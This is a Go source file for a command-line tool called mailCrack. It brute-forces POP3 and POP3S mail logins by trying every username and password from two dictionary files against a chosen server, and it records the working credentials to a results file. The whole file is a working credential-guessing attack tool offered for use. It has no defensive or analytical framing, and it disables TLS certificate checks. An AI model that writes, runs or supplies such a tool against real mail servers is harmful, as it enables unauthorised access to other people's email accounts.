package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"strings"
)

// 参数定义
var (
	mode    string
	domain  string
	port    string
	user    string
	pwd     string
	userdic string
	pwddic  string
	result  string
)

// banner信息
func Banner() {
	banner := `
	███╗   ███╗ █████╗ ██╗██╗      ██████╗██████╗  █████╗  ██████╗██╗  ██╗
	████╗ ████║██╔══██╗██║██║     ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
	██╔████╔██║███████║██║██║     ██║     ██████╔╝███████║██║     █████╔╝ 
	██║╚██╔╝██║██╔══██║██║██║     ██║     ██╔══██╗██╔══██║██║     ██╔═██╗ 
	██║ ╚═╝ ██║██║  ██║██║███████╗╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗
	╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
																			  
                                                  mailCrack v0.1 By vven0m

	`
	print(banner)
}

// 参数解析
func Flag() {
	flag.StringVar(&mode, "m", "pop3", "指定模式，eg:pop3/pop3s")
	flag.StringVar(&domain, "d", "192.168.0.1", "请输入邮箱域名或者ip地址,eg:mail.test.com.cn")
	flag.StringVar(&port, "p", "110", "请输入端口,eg:110、995")
	flag.StringVar(&user, "user", "", "请输入用户名")
	flag.StringVar(&pwd, "pwd", "", "请输入密码")
	flag.StringVar(&userdic, "ud", "", "请输入用户名字典")
	flag.StringVar(&pwddic, "pd", "", "请输入密码字典")
	flag.StringVar(&result, "o", "result.txt", "output result")
	//flag.StringVar(&t, "", "20", "线程")
	flag.Parse()
}

func readDictFile(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)
	var result []string
	for scanner.Scan() {
		passwd := strings.TrimSpace(scanner.Text())
		if passwd != "" {
			result = append(result, passwd)
		}
	}
	return result, err
}

// 写文件
func WriteResult(filename string, resStr string) error {
	file, err := os.OpenFile(filename, os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0666)
	if err != nil {
		return err
	}
	defer file.Close()

	writer := bufio.NewWriter(file)
	defer writer.Flush()
	writer.WriteString(resStr + "\n")
	return nil
}

// pop3s认证
func pop3Auth(username, password, host, port string) error {

	var conn net.Conn
	var err error

	mailServer := host + ":" + port
	resutltStr := username + ":" + password
	//resutltStrs := []string{username, ":", password}
	//fmt.Printf("[*]%s:%s\n", username, password)
	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
		ServerName:         host,
	}
	if mode == "pop3s" {
		conn, err = tls.Dial("tcp", mailServer, tlsConfig)
	} else {
		conn, err = net.Dial("tcp", mailServer)
	}
	if err != nil {
		fmt.Println("Connection failed:", err)
		os.Exit(1)
	}
	defer conn.Close()
	buf := make([]byte, 1024)
	n, err := conn.Read(buf)

	// POP3 commands
	conn.Write([]byte("USER " + username + "\r\n"))
	n, err = conn.Read(buf)
	if err != nil {
		fmt.Printf("Error")
	}
	//buf多出2个字节`13 10`,\r\n打印出来会自动换行，减去2个字节 userRes为输入密码后的响应
	//userRes := string(buf[:n-2])
	//userRes1 := string(buf[:n])
	conn.Write([]byte("PASS " + password + "\r\n"))
	n, err = conn.Read(buf)
	if err != nil {
		fmt.Printf("Error")
	}
	//输入密码后的响应
	passRes := string(buf[:n])
	if len(passRes) >= 3 && passRes[:3] == "+OK" {
		//fmt.Printf("[+] %s:%s\t用户响应：%s密码响应：%s", username, password, userRes, passRes)
		fmt.Printf("[+][Success] %s:%s\t%s", username, password, passRes)
		WriteResult(result, resutltStr)
	} else {
		fmt.Printf("[*] %s:%s\t%s", username, password, passRes)
		//fmt.Printf("[*] %s:%s\t用户响应：%s密码响应：%s", username, password, userRes, passRes)
		//WriteResult(result, resutltStr)
	}

	// Read the response from the server
	if err != nil {
		if err, ok := err.(net.Error); ok && err.Timeout() {
			fmt.Println("Read timed out")
		} else {
			fmt.Println("Read failed:", err)
		}
		os.Exit(1)
	}
	conn.Write([]byte("QUIT\r\n"))
	return nil
}

func main() {
	Banner()
	Flag()
	users, err := readDictFile(userdic)
	if err != nil {
		log.Fatalln("读取用户名字典文件错误：", err)
	}
	pwds, err := readDictFile(pwddic)
	if err != nil {
		log.Fatalln("读取密码字典文件错误：", err)
	}
	for _, user := range users {
		for _, pwd := range pwds {
			pop3Auth(user, pwd, domain, port)
		}
	}
}
